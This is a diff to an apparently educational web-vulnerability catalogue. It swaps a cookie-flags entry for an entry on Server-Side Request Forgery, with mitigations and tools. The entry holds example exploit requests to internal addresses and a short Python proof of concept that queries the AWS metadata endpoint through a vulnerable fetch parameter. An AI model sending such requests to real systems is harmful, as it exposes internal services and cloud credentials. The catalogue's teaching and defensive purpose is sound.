@@ -7878,43 +7878,61 @@ document.cookie
 
 - [OWASP Session Management](https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html)
 ---
-# WEBVULN-076: Cookie Without Secure or HttpOnly Flag
+
+***
+## PART XI OTHERS
+---
+# WEBVULN-077: Server-Side Request Forgery (SSRF)
 
 ## Category  
-Session Management
+Server-Side Vulnerability
 
 ## Vulnerability  
-**Insecure Cookie Attributes**
+**Server-Side Request Forgery (SSRF)**
 
 ## Description  
-Cookies without `Secure` or `HttpOnly` flags can be accessed via JavaScript or transmitted over insecure channels, increasing risk of theft via XSS or sniffing.
+SSRF occurs when a web application fetches a resource from a user-supplied URL without validating it, allowing attackers to force the server to make requests to internal systems, external APIs, or cloud metadata endpoints (e.g., AWS). This can expose sensitive data or services that are otherwise not accessible from the outside.
 
 ## Demo / Proof of Concept
 
-```http
-Set-Cookie: session=abcd1234;
+### Example Vulnerable Request
+```
+GET /fetch?url=http://example.com/image.jpg
 ```
 
-Accessible via:
-```js
-document.cookie
+### Exploit
+```
+GET /fetch?url=http://127.0.0.1:8080/admin
+```
+
+### Python PoC
+```python
+import requests
+url = "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
+resp = requests.get(url)
+print(resp.text if resp.status_code == 200 else "Blocked")
 ```
 
 ## Mitigation
 
-- **Always set `Secure`, `HttpOnly`, and `SameSite` attributes**.
-
-- Example:
-  ```
-  Set-Cookie: session=abcd1234; Secure; HttpOnly; SameSite=Strict
-  ```
+- Whitelist allowed domains/IPs for outbound requests.
+- Block internal IP ranges (127.0.0.1, 169.254.0.0/16, etc.).
+- Disallow dangerous protocols (`file://`, `gopher://`).
+- Perform DNS resolution and validation.
+- Use strict firewall rules to prevent access to internal services.
+- Log all outbound requests for anomaly detection.
 
 ## Testing Tools / Techniques
 
-- Inspect response headers via DevTools.
-
-- Use Burp or OWASP ZAP.
+- Burp Suite Repeater / Collaborator
+- SSRFmap
+- curl / Postman
+- DNS rebinding tools
+- AWS instance metadata PoCs
 
 ## References
 
-- [OWASP Session Management](https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html)
+- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+- https://portswigger.net/web-security/ssrf
+- https://github.com/swisskyrepo/SSRFmap
+---
